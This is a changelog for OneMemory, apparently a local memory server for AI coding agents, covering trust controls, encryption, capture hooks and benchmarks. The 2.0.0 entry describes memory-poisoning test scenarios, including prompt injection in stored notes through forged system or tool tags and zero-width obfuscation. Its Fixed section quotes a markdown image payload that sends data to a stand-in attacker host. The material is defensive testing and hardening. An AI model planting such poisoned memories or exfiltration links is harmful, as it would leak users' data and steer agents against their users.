- **Search had been discarding negation.** `not`, `never`, `no`, `nor`, `none`, `cannot`, `only`, `always`
  and the negated halves of contractions were stop-words, so *"never use the legacy client"* and *"always
  use the legacy client"* produced an identical keyword set and ranked identically. A question about which
  client to use could be answered with the opposite of what was stored. No reindex is needed — the index
  covers the raw text; only query-side extraction was throwing these away.
- **A `wait=` request could never answer instead of timing out.** Every timer behind "wait for a change" was
  unref'd, so the event loop could drain while the promise was still pending: an awaiting caller got no result and
  the process simply exited — a silent failure rather than a timeout. A server survived it because its listener held
  the loop open; nothing else did. The bounded timeout is now held, so a wait always settles, and shutdown still ends
  waiters at once through `abortAllWaiters()`.

## [OneMemory 2.0.1] - 2026-10-31

Release-only: published to the staging registry only, never to the public npm registry. Same code as 2.0.0; releases are now staged on npm and approved by the owner.

## [OneMemory 2.0.0] - 2026-10-31

OneMemory now remembers on its own: it records what your agent does, distills it into short typed notes, and brings the
right ones back at the start of the next session — with no model call unless you turn one on, nothing leaving your
computer, and every memory sourced, versioned and undoable. It installs into eight AI tools, imports from claude-mem,
mem0 and basic-memory, and publishes its retrieval numbers (LongMemEval-S, LoCoMo) with the scripts to reproduce them.

**Upgrading:** the database moves to schema v16 on first open (a backup is copied next to it first, as before). Older
OneMemory versions cannot open a v16 database, so upgrade every machine that shares one. Nothing is captured until you
run `onememory setup --capture` and say yes.

### Added
- **Automatic memory (opt-in).** `onememory setup --capture` wires Claude Code's hooks (and Codex, Gemini CLI, Muse) to
  `onememory hook <event>`. Each tool event is redacted (`<private>…</private>` stripped, secrets masked) and kept briefly;
  at session end it is distilled, without a model, into typed observations (files changed, commits, test runs, fail-to-pass
  bugfixes, decisions, security notes) and one session summary. The hook never blocks your agent: it fails open and always exits 0.
- **Session-start context.** A ranked pack of what matters for this branch, these files and your recent work, inside a
  token budget (`ONEMEMORY_RECALL_TOKENS`, default 1500), behind an untrusted-data banner, with a savings footer.
- **Progressive disclosure tools:** `memory_index` (one line per memory with its token cost), `memory_timeline`, `memory_get`
  and `session_list` over MCP, and `/index`, `/timeline`, `/get`, `/sessions` over REST — look first, then fetch only what you need.
- **File context on Read:** before your agent reads a file, it is told what memory knows about that file (advisory; it never blocks the read).
- **Dashboard Sessions tab** with a timeline per session.
- **Optional local summary:** `ONEMEMORY_LLM_URL` + `ONEMEMORY_LLM_MODEL` let a local model (Ollama, LM Studio) rewrite each
  session summary in one call at session end. Off by default; loopback only unless you allow otherwise.
- **`ONEMEMORY_EMBEDDINGS=auto`:** semantic search when the local embedding endpoint answers, silently keyword-only when not.
- **Retrieval benchmark:** `onememory bench --longmemeval` and `--locomo` download the public datasets once and score retrieval
  (recall@k, nDCG, MRR, latency) with no model and no judge. Results and caveats: [docs/BENCHMARK.md](./docs/BENCHMARK.md).
- **Decay for captured rows.** Observations nobody updated or read for `ONEMEMORY_DECAY_DAYS` (30) and session summaries idle
  `ONEMEMORY_DECAY_SUMMARY_DAYS` (180) are archived, never deleted, by the existing expiry sweep and at session end. Ordinary notes,
  decisions and rows tagged `pinned` never decay; `0` turns it off. `onememory decay [--dry-run]` previews or runs it now; `onememory
  restore <id>` (new, with `onememory archive <id>`) undoes it. `memory_stats` / `GET /stats` gain `decay: { candidates, archived }`.
  A restored captured row counts as just read, so the next sweep does not take it again.
- **Memory quality view.** `onememory quality [--json]`, `GET /quality` (admin) and a dashboard **Quality** tab list near-duplicates,
  stale notes with a newer twin, quarantined writes, notes the linter flags and decay candidates, each with a fix through an existing
  safe path (supersede preview + confirm with undo, consolidate dry run, archive / restore, quarantine approve / reject). New admin
  routes `POST /quarantine/:id/approve|reject` back the dashboard buttons.
- **Benchmark suite E, "Memory poisoning": 123 deterministic scenarios** (was 109): A 32, B 31, C 27, D 19, E 14. The new suite
  proves injected or malicious memories do not silently reach an agent as trusted content — prompt-injection (plain, forged
  system/tool tags, zero-width-obfuscated) is quarantined; a distrusted or low-trust writer cannot outrank or silently overwrite a
  trusted fact; secrets are redacted on capture and blocked on write; a forged writer or namespace is stamped with the real one; an
  unsigned import cannot pose as verified; a captured web fetch is not promoted to trusted memory; the SessionStart injection carries
  the untrusted-data banner and leaves distrusted notes out; and mass near-duplicate flooding cannot bury the real answer. Headline
  `poison-reach-count` must be 0. It added two bench ops (`capture`, `session_start`) to the runner. The one gap it found,
  `GAP-POISON-MDLINK`, is fixed (see Fixed).

### Changed
- **Captured prompts and tool inputs are now encrypted at rest** when encryption is on, the same way tool outputs already were. Turning
  encryption on or off seals or opens them too. Databases made by earlier test builds of this version get the new column when opened.
- **Session summaries rewritten by the local model are labelled.** `memory_get` and `memory_index` mark them `model_written`, and the
  session-start context and index lines say "(model-written)". The file, command and outcome lines under them are still the automatic ones.
- **`onememory import --from claude-mem|mem0|basic-memory [--path p] [--dry-run] [--yes] [--namespace ns]`**: bring another memory
  tool's notes in, with the same rules as `import --claude` (local only, dry run, secrets skipped and never shown, memory linter and
  quarantine, re-runs add only what is new via a stable id in `source`). claude-mem's SQLite database is opened read only;
  observations become `observation` rows with their type, files, project and original dates, and session summaries become `summary`
  rows. mem0 reads a JSON export (categories become tags). basic-memory reads a Markdown folder, with the permalink as the id.
  Imported rows are written by `import:<tool>` and tagged `imported:<tool>`; claude-mem's rows also carry the model-written label. How to switch over and cleanly uninstall the old tool: [docs/switching.md](./docs/switching.md).
- **Project profile at session start:** a "What I know about this project" block at the top of the injected context: recent decisions,
  conventions (notes tagged `convention`), the files memory mentions most (`note_files`), the last session and the open-task count. Deterministic (no
  model), inside the recall budget, capped by `ONEMEMORY_PROFILE_TOKENS` (default 300, at most half the budget); `ONEMEMORY_PROFILE=off` turns it off.
- **"Why was this shown?":** every injected note and index line ends with a short tag such as `{files,kw 3d}` (linked to files you changed, matches
  your branch / changed files / recent work, among the newest, a decision; age in days), explained once by a legend line.
- **Never show again:** a note tagged `never-show` is left out of the session-start context, the profile and the file-context hint; it stays
  searchable. Set it with `onememory never-show <id>` (`--undo` to reverse), the dashboard's **never show** button, or a normal tag edit.
- **Token & footprint meter:** per session and in total, the tokens injected at session start, the captured work they stood in for, and the tokens
  the optional local summarizer used (0 when off), plus capture events and database size. Aggregate numbers only (table `meter_sessions`, created on
  first use). Shown by `onememory doctor`, `GET /stats` / `memory_stats` (`meter`) and the dashboard's **Meter** view.

- `onememory setup` now also finds and connects **Codex CLI** (`~/.codex/config.toml`: only the `[mcp_servers.onememory]`
  table is added or removed, the rest of the file stays byte for byte), **Gemini CLI** (`~/.gemini/settings.json`),
  **Muse** (`~/.config/muse/settings.json`, keeps or adds `"schema_version": 1`), **VS Code** (user `mcp.json`, `servers`)
  and **Zed** (`settings.json`, `context_servers`), with the same plan, diff, backup and `--undo` as before.
- `--hook` / `--capture` also wire the hooks of Codex (`~/.codex/hooks.json`), Gemini CLI and Muse to `onememory hook <event>`.
- `onememory hook`: reads Gemini CLI's `prompt_response` as the stop text, and takes the session id from `MUSE_SESSION_ID`
  or `GEMINI_SESSION_ID` when stdin has none.
- `onememory uninstall [--dry-run] [--yes] [--purge] [--no-backup]`: replays every recorded setup in reverse (all apps,
  MCP entries and hooks), so configs return byte for byte where nothing changed them since and files setup created are
  deleted; entries setup did not add are listed, not touched. `--purge` then makes a final backup
  (`~/onememory-final-backup-<time>`) and only after it worked deletes the data folder and setup's backup copies.
- `onememory doctor` reports the data folder size (warns over 1 GB), a full capture spool, and the capture backlog
  (events not yet distilled; warns over 10,000).
- [docs/footprint.md](docs/footprint.md): every path OneMemory writes, when, and how to remove it.

### Changed

- `onememory backup` without `--out` writes to `~/onememory-backup-<time>`, not the current folder: run inside a repo,
  the copy of your notes and key could be committed.

### Fixed

- Capture spool: an event that keeps failing to store is dropped after 5 drains instead of cycling forever, and a
  `.draining` file left by a killed hook is drained later instead of staying on disk.
- `onememory watch` stops with an error after 10 failures in a row instead of retrying every 5 s forever.
- **`state_search` answers whole questions.** Keyword search needed every word to match, so a question such as "which
  region do we deploy production to?" found almost nothing (LongMemEval-S recall@5 11.9%). When the all-words search
  leaves room, it now adds notes matching some of the words, always ranked below full matches (recall@5 95%).
- **Writes stay fast as memory grows.** Each write stored a similarity link to every close note, about 430 per captured
  observation, so writes took ~100 ms and the database reached 111 MB at 3,000 notes. At most 32 are kept (reads use 10):
  3.8 ms and 18 MB.
- **Markdown image exfiltration is held** (`GAP-POISON-MDLINK`): a note with a remote markdown image carrying a query
  string (`![x](https://attacker/p?data=...)`), which loads by itself when rendered, goes to quarantine. Badge hosts are exempt.

## [OneMemory 1.7.2] - 2026-10-25

Windows fixes only. **No schema change** (still v15).

### Fixed
- **`sync --git` stopped on Windows** with "points outside the repository": Git reports the repository's long name (`C:/Users/runneradmin/...`) while the
  link check saw the 8.3 short name (`RUNNER~1`), so the two never matched. Both sides now go through the operating system's own real-path routine, a
  folder that does not exist yet is resolved through its nearest existing parent, and the comparison is segment based and ignores case on Windows.
  Links and `..` that leave the repository are still refused (tests added).
- The macOS path test in `setup.test` now accepts Windows separators.

## [OneMemory 1.7.1] - 2026-10-25

Fixes from an independent review of 1.7.0. **No schema change** (still v15).

### Fixed
- **`import --claude` could hang** on a Markdown line such as `# a` followed by thousands of spaces (a regular expression that backtracked). Headings
  are now found with plain string steps (lines over 500 characters are text), HTML comments are removed in one pass, and every pattern on the
  import, setup, linter and secret-masking paths was run against 1 MB hostile lines with time limits in the tests.
- **`sync --git --dry-run` created things**: it opened the database (making the data folder and possibly running the one-way upgrade). It now only
  looks; an old or missing database is not opened.
- **Endless sync commits with two computers**: each computer rewrote every file's `origin_writer` with its own name. A note from another computer
  now keeps the name its file came with, so once both agree a sync says "nothing new to commit".
- `import --claude` queued a section the memory linter held again on every run. It now remembers it (`claude-import-held.json` beside the database).
- Rolling back: the notes on restoring `.pre-v15-backup` now say to also delete `state.db-wal` and `state.db-shm`; `setup --undo` no longer says
  "your notes were not touched" when an old claude-bridge entry came back after its database was upgraded, and prints the exact steps (and that the old
  program cannot open an upgraded database).
- Migration prefers `ONEMEMORY_DB_PATH` over `CLAUDE_BRIDGE_DB_PATH` when an old entry has both (as at run time), and reads old entries that contain
  comments or trailing commas (otherwise it says plainly how to migrate by hand).
- Secret detection now catches `Authorization: Bearer <token>`, `Bearer <20+ characters>` and a password written as plain words (`password: correcthorsebatterystaple`).
- Review queue: only an administrator can add or remove the `reviewed` tag; `import:claude` can no longer be used as a token label; the queue pages
  through every note instead of the newest 500.
- Setup refuses to replace an existing 0-byte config file (it may have been cut off while saving); `--force-empty` overrides.
- The file rename retry is about 2 seconds (about 7 on Windows); the docs said half a minute.
- Sealed git file names are now a keyed hash (HMAC with the sync key) instead of an unkeyed one, so a known note path cannot be confirmed from the repository.
  (1.7.0 was not released; repositories sealed by a 1.7.0 build must be sealed again.)
- `sync --git` refuses a remote whose address has a password or token inside it, and hides `user:pass@` in any address it prints.
- The `cmd /c npx` note is worded as commonly needed on native Windows and not confirmed by the Claude Code MCP docs.

### Documented
- Setup's backups and `setup-history.json` can hold the same secrets as your config: `0600` on macOS/Linux, and on Windows they use your profile's
  normal permissions (docs/live-claude-code.md, section 6).

## [OneMemory 1.7.0] - 2026-10-25

Easy, safe connection to Claude Code and an easy way in for what Claude Code already knows. **No schema change** (still v15).

### Added
- **`onememory setup`** (also `npx onememory-mcp setup`). Finds Claude Code (`~/.claude.json`), Claude Desktop (per OS) and Cursor, shows a plain-language
  plan and the exact lines it will change (secrets masked), writes only after you type `y` (`--yes` for scripts), saves a timestamped backup of every
  file, and writes atomically. It edits the file *in place*: only the OneMemory entry changes; other servers, comments, number formats, line endings,
  BOM, indentation and key order stay byte for byte. It re-reads the file right before writing and applies its change to what is there now (Claude Code
  rewrites `~/.claude.json` while it runs), reads it back afterwards and checks again a moment later. Symlinked configs are edited at their target.
  Opens the database and writes/reads back a test note before touching any config. `--dry-run`, `--undo`, `--only`, `--project`, `--db`, `--hook`/`--no-hook`.
  Checks the Node version with a plain message. The optional SessionStart hook is merged (never overwritten) and only with your agreement.
- **Moving from claude-bridge.** An old `claude-bridge` entry (by name, path or `CLAUDE_BRIDGE_*` variables, including per-project entries) is replaced by
  `onememory` in the same place; `CLAUDE_BRIDGE_DB_PATH` becomes `ONEMEMORY_DB_PATH` with the same value; the old install folder is never touched; the
  database upgrade keeps its verified `.pre-v15-backup`.
- **The old `CLAUDE_BRIDGE_*` variables now work** (every `CLAUDE_BRIDGE_<NAME>` is read as `ONEMEMORY_<NAME>`; the new name wins). Before this release they
  were silently ignored, so a client still configured with `CLAUDE_BRIDGE_DB_PATH` would have started on an empty database. `doctor` says when it maps one.
- **`onememory import --claude [--dry-run]`.** Imports `CLAUDE.md` files (user, project, local) and Claude Code auto memory
  (`~/.claude/projects/*/memory/*.md`), cut at headings, tagged with source and project, written by `import:claude`, idempotent by a stable key. The
  secret linter runs on every section; flagged sections are skipped and counted, never printed. Refuses links that leave the memory folder or do not lead
  to Markdown, does not follow `@imports`, never opens the network. A dry run never creates or upgrades a database.
- **`onememory sync --git <repo>`.** The Markdown export/import over a private git repository you own: fetch, merge, three-way merge into the database,
  write back, commit, push, with a retry if another computer pushed first. `--encrypt` seals every file (AES-256-GCM, opaque names) before commit; the key
  stays in a file on your computers and a key inside the repository is refused. No hosted server. Deletes do not propagate (as with file sync).
- **Dashboard "Review" view**: notes agents wrote that nobody has looked at (filter by writer; Accept adds the tag `reviewed` without changing the author;
  delete). The page now says OneMemory instead of claude-bridge.
- `onememory recall --db <file>` (used by the hook that setup writes when your database is not in the default place).
- Docs: README "Install in 60 seconds", [docs/live-claude-code.md](./docs/live-claude-code.md), a git section in docs/file-sync.md.

### Changed
- `doctor` recognises hooks written by `setup` (which call `node <cli.js> recall`) as well as `onememory recall`.

## [OneMemory 1.6.0] - 2026-10-25

Closes every gap the 1.5.0 benchmark recorded, without ever changing a memory silently. **Schema v15** (a verified
`<db>.pre-v15-backup` is made first; no downgrade path). Everything else is additive.

### Added
- **Replacing a memory is always two steps** (CLI `onememory supersede`, REST `POST /supersede/{preview,confirm,undo}`, MCP
  `memory_supersede_preview` / `_confirm` / `_undo`). The preview changes nothing and shows "ARE YOU SURE YOU WANT TO REPLACE THIS?" in plain
  words: each old note's text, writer, dates, tags, how many notes are similar to it and how many tasks depend on it, what you lose, what you do
  **not** lose, and a **RED FLAG** when it applies. The confirm needs the preview's one-time code: it works once, expires (10 minutes;
  `ONEMEMORY_SUPERSEDE_TTL_SECONDS`), is bound to the caller, to the exact notes and revisions previewed and to the exact replacement text, and
  fails if anything changed in between. On the command line you type the number of notes you are replacing (or `yes`); a script must pass
  `--confirm-token`. There is no `--yes`.
- **Nothing is deleted.** The old note becomes `superseded` with a `superseded_by` link, leaves search, lists, `relevant` and
  similar-note suggestions, and shows (always labelled) with `include_superseded`. `supersede undo` brings it back; both are recorded, and a write token can undo only a replacement it made itself (an administrator can undo any). Hard delete
  is unchanged, except that hard-deleting a note that *replaced* others brings those back rather than leaving them hidden for good. Details: [docs/replacing-memories.md](./docs/replacing-memories.md).
- **Trust guard.** A distrusted writer is refused outright; a replacement that claims lower confidence than the note it hides needs an
  administrator and an explicit `acknowledge_risk` (on the CLI, typing `i accept the risk`). Confidence never overrides trust.
- **Version history.** Every edit keeps the text it replaces (bounded: `ONEMEMORY_HISTORY_VERSIONS` default 20, `ONEMEMORY_HISTORY_MAX_BYTES`;
  the original is never dropped and one writer cannot flood out another's version). Admin-only `GET /notes/:id/history`, `memory_history`,
  `onememory history`; `restore` makes a **new** version; `purge` forgets history. Encrypted at rest with note bodies; carried by export/import
  (as claims; `?history=0` / `--no-history` leaves it out).
- **Optional `confidence`** (0 to 1) on write and update (REST, MCP `state_write`): validated, labelled with who claimed it, kept through edits,
  export and import, shown in search and in the replace warning. A claim only.
- Six MCP tools (`memory_supersede_preview`, `memory_supersede_confirm`, `memory_supersede_undo`, `memory_history`, `memory_restore_version`,
  `memory_history_purge`; 28 tools in all), `include_superseded` on `state_search` / `state_list` and the REST `GET /search` / `GET /notes`.

### Changed
- **Ranking.** When two notes are about the same thing and the older one is flagged stale, it now stays behind the newer one in search even if it
  matches the words better (it is still returned and flagged). The retrieval evaluation set is unchanged: best-of-both recall@1 1.000, recall@5 1.000,
  MRR 1.000; keyword-only recall@1 0.700, before and after.
- **Benchmark: 109 deterministic scenarios** (was 75): A 32, B 31, C 27, D 19. All four known gaps are now `fixed`, and the scenarios that carried them pass
  (A05, A06, A10, A20, B03 include the confirmed replace steps; A11 passes by the ranking fix alone; B08, B09 by history; D10 by confidence). New
  scenarios cover: a preview writes nothing; a confirm needs a valid code; expired, reused, damaged and changed-revision codes fail; a code is useless to
  another writer or tenant; undo; history restore; the trust-guard cases; confidence round trip; and cross-tenant isolation of history, previews and undo.
  stale-hit-rate@1 36% to 0%, current-recall@1 62% to 100%, fields lost 1 to 0.
- The pre-upgrade copy is now named after the schema it upgrades to: `<db>.pre-v15-backup`.

### Known limits
- Over MCP and REST the "Are you sure?" text is relayed by the agent. The code makes it impossible to confirm without a preview, but only the command
  line asks the person directly. See [SECURITY.md](./SECURITY.md).
- OneMemory does not guess that a new note replaces an old one. Writing a second note and leaving the first still returns both (as before); replace
  explicitly if you want the old one out of sight.

## [OneMemory 1.5.0] - 2026-10-25

A benchmark for the question "can one agent silently turn a weak guess into shared truth?". Additive only: no
schema change, no change to any existing result shape or default.

### Added
- **`onememory bench`** (and `npm run bench`): 75 deterministic, offline, no-model scenarios in four suites, run on a
  throwaway store through the real REST API (plus the `memory_consolidate` MCP tool for merges). **A** stale memory
  (stale-hit-rate@1/@5, current-recall@1), **B** contradiction recovery, **C** permission isolation (leakage count,
  unexpected denials), **D** provenance retention (fields lost). `--json` gives every scenario with expected vs actual;
  exit 1 on a failure. Never reads or writes your own data (it hides `ONEMEMORY_*`, uses a temporary folder and its own
  audit log). Scenarios are JSON files in `bench/scenarios/` (shipped in the package), and a small adapter interface
  (write, update, delete, search, plus actor) lets the same scenarios run against another memory system.
  See [docs/BENCHMARK.md](./docs/BENCHMARK.md).

### Fixed
- **REST `PUT /notes/:id` now honours `if_rev`** (compare-and-swap), as the MCP tool `state_write` already did. An edit made on
  an out-of-date copy is refused with `409` ("stale write: ... re-read and retry") instead of silently replacing a newer write.
  Without `if_rev` nothing changes (last write wins). Found by benchmark scenario B16.

### Known gaps
- **Known gaps are recorded, not hidden.** Scenarios that fail because OneMemory lacks the behaviour carry a `known_gap`
  marker and are listed in the README: `GAP-SUPERSEDE`, `GAP-RECENCY`, `GAP-HISTORY`, `GAP-CONFIDENCE` (a fifth, `GAP-REST-CAS`, was found and fixed in this release).
  They do not fail the run; a marked scenario that starts to pass does.

## [OneMemory 1.4.2] - 2026-10-24

A third expert review of 1.4.1 (coding, security, architecture, developer experience, infrastructure) found
the holes below; every confirmed one is fixed. **Upgrading from 1.3.x: read
[docs/upgrading.md](./docs/upgrading.md).** The schema stays **v14** (one idempotent column,
`notes.imported_unverified`, is added on open). Result shapes only gained fields.

**EXPERIMENTAL:** signed attestations, cross-server writer ids, `trust rotate`, `trust attester-revoke` and
`--any-server` are marked as such in the docs, the CLI help and the MCP tool descriptions; their formats may
change in a minor release.

### Security
- **A distrusted but still-active write token can no longer edit the metadata (tags, source, namespace) of a
  trusted note** it did not write (it used to re-label it without touching the content). The edit path also caps
  the taint set at 200 names, keeping the names an active rule matches.
- **`include_distrusted` for a namespace-pinned admin is honoured only in the token's own namespace**
  (REST, MCP, by-id reads and tasks). Asking across a granted namespace is refused. The primary token is always
  an admin: documented, and `onememory doctor` warns when distrust rules exist and it is the only token.
- **Notes imported without a verified attestation are marked `imported_unverified`** (shown in reads and in the
  provenance banner). `--require-attestation`, `require_attestation` on `/import` and
  `ONEMEMORY_IMPORT_REQUIRE_ATTESTATION=1` reject them. The default import behaviour is unchanged.
- **Keys.** `trust rotate` takes effect in a running server (the key file is re-checked on use). The retired
  public key is recorded as a retired key of this server, so earlier exports keep verifying; the old private
  key is no longer kept unless `--keep-old-private`. `ONEMEMORY_TRUSTED_ATTESTERS` and `attester-add` follow
  the same rules (both accept a retired own key; neither accepts the current one). `not_after` is judged
  against the time of verification, so a backdated `exported_at` no longer bypasses it; it is documented as an
  **expiry, not a revocation**. New `trust attester-revoke` / `attester-unrevoke` (CLI, REST, MCP) and
  `ONEMEMORY_ATTEST_MIN_VERSION` (refuse version 1 attestations). `trust export-key` no longer writes through
  an existing file or a dangling symlink. The "restored without its key" warning fires only when the database
  remembers a previous key that is now missing.
- **Trust log:** pruned per namespace (a flooding namespace cannot push out another's history); `key-rotate`
  rows are hidden from pinned admins; namespace-specific rules cap at 450 in total so `*` rules always fit.
- `/stats` `totalNotes` and the other counters exclude hidden notes for non-admins; a task cannot name a hidden
  task as its parent or blocker (same error as a missing one); writer labels are NFKC-normalised with
  zero-width characters removed (case is still exact); a library `notWrittenBy: ""` no longer hides every note.
- `distrust` reports `matched_notes`, so a typo in a label (0 matches) is visible.
- **`POST /relevant`: one namespace for the gate and the search.** `?namespace=work` with `include_distrusted`
  in the body and no body namespace used to pass the pinned-admin check on the query namespace while the search
  fanned out over every readable namespace. The body namespace (else the query one) is now used for both.
- **Stored writer labels are cleaned once on open** (an idempotent migration, flag `labels_clean_v1` in `_meta`):
  rows written by 1.4.1 and earlier whose label NFKC or zero-width stripping changes (an emoji with a joiner, a
  trademark sign) are re-written, and distrust rules are re-stored in canonical form, so a rule keeps matching
  old notes. The cleaning itself is now idempotent (`e` + zero-width + accent used to give a different result on
  the second pass, leaving a rule that could never match).
- **`trust rotate` cannot lose the retired public key.** The retired key is committed first, then the key file is
  swapped, then the audit line is written; a failure at any step leaves the old key recognised. A rotation
  landing while a server loads its signing key can no longer leave the old key cached.
- A distrusted writer claiming a task now gets a refusal that says "claim"; `--not-after` is documented
  and described in the CLI help as what it is: from that time the key is believed for nothing, old exports
  included.

### Performance
- The distrust predicate uses **one `json_each` membership test per row** instead of one `instr` probe per
  label, with equivalence tests against the old predicate and the JS rule check (random data).
  Measured on 100,000 notes with a 30-name taint set on every note (median of 7, first page of `list`): 100 `*` rules 10.9 s -> 1.06 s, 10 rules 1.31 s -> 1.09 s, no rules unchanged (0.17 s). `/changes` with 100 rules 11.2 s -> 0.96 s.
- The markdown vault export was quadratic in the number of hidden notes; it is linear now.
- `import --file` streams the file in batches of 500 instead of parsing it whole. A 5,000-note, 4.3 MB file: peak memory 369 MB -> 135 MB and 16.9 s -> 2.0 s; a 30,000-note, 25.8 MB file imports in 11.9 s at a peak of 283 MB (the old path did not finish within 2 minutes). A multi-batch
  restore defers the similarity graph; run `onememory rebuild-edges` afterwards (the command says so).

### Changed
- Backups: the copy is built as `state.db.partial`, verified and renamed; stale `-journal` sidecars, partial
  copies and an existing pre-upgrade copy of a different state are handled (the old one is kept under a dated
  name); a copy is checked for integrity and for its note count. A read-only data directory gets a readable error
  for an existing database too (the WAL switch is inside the guarded block).
- **The upgrade now refuses to run when the pre-upgrade copy cannot be made** (no room on the disk, a failed
  copy), with an error that says what to do; `ONEMEMORY_SKIP_PREMIGRATION_BACKUP=1` upgrades without a copy.
  This is what docs/upgrading.md and docs/trust.md always said; the code used to continue with a warning.
  An existing copy that cannot be opened (permissions) is moved aside under a dated name, never deleted; only a
  file that is empty or not a database is replaced. `backup --prune-premigration` says it removes the dated
  copies too.
- **`import --file` is all-or-nothing on a bad file.** The whole file is checked first (valid JSON to the end,
  nesting depth, element size, text fields, tag lists and their limit) before the database is opened: a
  truncated or hostile file imports nothing and says so. If a later write fails, the message reports how many
  notes were imported and how many were not, and to re-run with `--dedupe`. Batches are also bounded by size
  (32 MB of text), and entries that are not objects are reported instead of silently ignored.
- `.github/workflows/publish.yml` waits for the full build and test matrix (ubuntu, windows, macos).
- The test script preloads `test/setup-env.ts`, so a developer's `ONEMEMORY_*` environment cannot change a
  result. The gate-guard test has positive controls, matches any receiver, uses a keyed allow-list and an admin
  client for the consolidation candidates.
- The CLI error for an unpinned attester names `--any-server` (`any_server: true` over the API).

### Documentation
- New [docs/upgrading.md](./docs/upgrading.md). `docs/configuration.md` lists every `ONEMEMORY_*` variable
  once with its real default (a test greps the code for them). README `attester-add` carries `--server-id`;
  `trust.md` no longer names a nonexistent command; the feed field names are in the glossary; the RUNNER_ID
  fallback text matches the code (`COMPUTERNAME`, then `HOSTNAME`, then `default`).

### Tests
- 1237 -> 1313 tests (new: `test/trust-142.test.ts`, `test/rv6-fixes.test.ts`, the rewritten gate guard); `npx tsc --noEmit` clean; the full suite, including the packed-tarball smoke test, passed three times in a row.

### Not done
- A lock for two processes migrating at once, an admin
  `clear-taint` command, hiding admin-only tools from a non-admin `tools/list`, and reserving the runner
  namespace were reviewed and left for a later version.

## [OneMemory 1.4.1] - 2026-10-24

A second expert review of 1.4.0 (coding, security, architecture, developer experience, infrastructure) found
real holes in the trust feature. All are fixed here; schema is **unchanged at v14** (an idempotent
`trust_attesters.not_after` column is added on open). Result shapes only gained fields.

### Security
- **Distrust can no longer be laundered.** `merged_from_writers` is now a monotonic *taint set*: a content
  rewrite adds the previous writer (and the attested author it carried) instead of dropping them, an import
  folds the file's claimed names into it, and a verified attestation's earlier hops stay. A trusted writer
  editing, tagging or re-exporting a distrusted writer's note leaves it hidden; stripping the attestation,
  deleting the attester or losing a key cannot remove taint. (Only lifting the rule shows it again.)
- **One gate for reads by id.** `Store.readVisible` / `filterVisible` are used by `GET /notes/:id`, `PUT`,
  archive/restore, `state_read`, `state_write` by id, `task_get`, the consolidation candidates and the janitor.
  A tags-only update of a hidden note no longer echoes its body (404 for non-admins). New
  `test/trust-gate-guard.test.ts` fails if a new GET route, MCP tool or raw store read is added unclassified
  and runs a canary note through every classified route.
- **The janitor and `memory_consolidate`** never merge a distrusted note into a trusted one (the pool excludes
  hidden notes; a mixed manual merge is refused).
- **`client_key` replay** (`task_put`, `session_handoff`) can no longer return, or be blocked by, a distrusted
  writer's task or handoff; `task_put` by id refuses a hidden task.
- **`include_distrusted` is admin-only** on REST (403), MCP (error), the CLI flags that need it and the
  dashboard (which unticks its box). A namespace-pinned admin sees only its own rules, trust-log lines and
  runner targets, never the attester list. Rules are capped per namespace (50) as well as in total (500); the
  trust log keeps its newest 1000 rows.
- **The markdown vault export** skips distrusted notes (and prunes their older files); `--include-distrusted`
  writes them marked `distrusted: true`. A vault file's `origin_writer` joins the taint set.
- **Attestations:** a trusted key is now **pinned** to one `server_id` (`attester-add` requires `--server-id`,
  or an explicit `--any-server` that is flagged everywhere and logged); an unpinned key cannot claim this
  database's own id; `server_id` in an attestation must be a UUID; `--not-after` retires a key; a
  `ONEMEMORY_TRUSTED_ATTESTERS` entry needs `<server_id>=<key>` (or the JSON form), a bare key is refused and
  logged. **Version-2 attestations** also sign `created_at`, `source`, `expires_at`, `archived_at`, `rev` and
  the export time; version-1 attestations from 1.4.0 still verify. The verifier caches parsed public keys.
- **Runner heartbeat forgery:** a tag-only edit (or any non-heartbeat write) by the `runner` label no longer
  refreshes liveness: the body's own `alive_at` must agree with the server stamp within 120 s, and a
  `runner` note without a valid body is ignored. A *future* `alive_at` is still never believed.
- **Import robustness:** a corrupt `.attest-key`, or a key location that cannot be created, no longer fails an
  import of unsigned notes; the CLI strips terminal escapes and control characters from every string it
  prints out of an import file and never builds a suggested command from file text.

### Changed
- **`GET /export` and `onememory export --format json` are back to the 1.3.x shape by default**:
  `{"notes": [...]}` (the same top-level shape; the notes themselves carry the newer fields). The header and signatures are opt-in: `?attest=1` / `--attest`
  (`--no-attest` and `?attest=0` are accepted no-ops). `POST /import` and `import --file` read the plain
  object, the attested envelope and a bare array. *(1.4.0 had made the envelope the default and described
  `?attest=0` wrongly; see the correction in that entry.)*
- `not_written_by` / `not_note_written_by` now also skip notes the writer touched earlier (the taint set), which
  is what an exclusion filter is for; `written_by` / `note_written_by` still match only the current writer.
- `parseWriterRef` split a `<server_id>/<label>` after truncating the whole string, so a label of about 64+
  characters lost its server id; the id is now split first and the label normalised like a stored `written_by`.
  Rules that can never match (an empty label, a bare server id) are refused. SQL and JS matching agree on
  quotes, backslashes, unicode and case (tested pairwise).
- **Faster policy checks.** The distrust predicate lost its `COALESCE` wrapper (every column it reads is
  `NOT NULL`) and probes the taint set only on rows that have one. On a 300,000-note database, `list` with 100
  rules went from 4267 ms to 659 ms, `/changes` from 5101 ms to 1458 ms; with 10 rules 811 to 378 ms and
  1317 to 929 ms; with no rules nothing changed (74 ms / 577 ms).
- **Runner status:** a runner that never sent a heartbeat now raises the "no heartbeat seen" notice for the
  commands addressed to it (its namespace is unknown, so they count in their own namespace and the target
  carries `namespace_unconfirmed: true`). Heartbeat notes of runner ids silent for 30 days are pruned
  (`ONEMEMORY_RUNNER_HEARTBEAT_PRUNE_DAYS`, `0` = never). Removed the dead `waitingCommandTasks` helper and the
  duplicate runner-id/namespace readers.
- `trust --help` prints help; `trust` rejects stray arguments (an unquoted `--namespace *` that the shell
  expanded) with a hint; `trust list` no longer creates a signing key; `trust export-key --out` and
  `trust rotate` are new; `attester-add --not-after`; a value flag no longer swallows a following known flag.
- `runner_status` and `not_written_by` tool descriptions say what they now do.

### Migration and backup
- The pre-upgrade copy is written to `<db>.pre-v14-backup.<pid>.partial`, checked (size, schema version, note
  count, integrity) and only then renamed; a crash leaves a sweepable `.partial`, never a truncated backup. A
  valid existing copy is kept, an empty or truncated one replaced. The disk space is checked first. The
  rollback text says to **move** the file back.
- `onememory doctor` reports the copies (size, age) and the key file mode; `onememory backup
  --prune-premigration` removes them; `onememory encrypt enable` warns that earlier copies are plaintext.
- `onememory backup --include-attest-key` (the key is left out, with a message, otherwise). Restoring a database
  without its key mints a new one and says so. `.attest-key`, `ONEMEMORY_ATTEST_KEY_FILE` and the pre-upgrade
  copies are re-tightened to 0600 at every start.

### Docs and tests
